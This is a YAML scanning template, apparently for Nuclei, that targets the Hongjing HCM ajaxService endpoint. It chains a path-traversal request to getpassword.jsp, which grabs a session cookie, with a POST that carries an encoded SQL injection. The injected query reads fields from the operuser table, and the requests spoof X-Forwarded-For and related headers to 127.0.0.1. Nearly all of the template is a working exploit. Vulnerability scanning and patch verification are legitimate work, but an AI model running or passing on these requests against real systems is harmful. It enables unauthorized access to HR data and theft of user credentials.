id: hj-HCM-getpassword-sqli
info:
  name: Template Name
  author: wangzong
  severity: high
  description: 宏景HCM-ajaxService接口-SQL注入
  reference:
    - https://
  tags: tags
http:
  - raw:
      - |+
        GET /templates/attestation/%2e%2e/%2e%2e/templates/index/getpassword.jsp HTTP/1.1
        Host: {{Hostname}}
        Connection: close

      - |-
        POST /ajax/ajaxService HTTP/1.1
        Host: {{Hostname}}
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/126.0.6478.54 Mobile/15E148 Safari/604.1
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Cookie: JSESSIONID=EA3A4376F5B1EAAD5E1492560657F504
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        X-Originating-IP: 127.0.0.1
        X-Forwarded-For: 127.0.0.1
        X-Remote-Addr: 127.0.0.1
        X-Remote-IP: 127.0.0.1
        Cookie: {{JSESSIONID}}
        sec-ch-ua-platform: "iOS"
        sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"
        sec-ch-ua-mobile: ?1
        Content-Type: application/x-www-form-urlencoded
        Connection: close
        Content-Length: 265

        __type=extTrans&__xml={"functionId":"151211001137","sql":"select~20111*111~20a~30~31~30~30~2c~31~20a~30~31~30~31~2c~31~20b~30~31~31~30~2c~31~20e~30~31~32~32~2c~31~20e~30~31a~31~2c~31~20dbase~2c~31~20a~30~30~30~30~20from~20operuser","nbase":"1"}
    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - '200'
      - type: word
        part: body
        words:
          - '12321'
    extractors:
      - type: regex
        name: JSESSIONID
        internal: true
        part: header
        regex:
          - "JSESSIONID=([0-9A-F]+);?"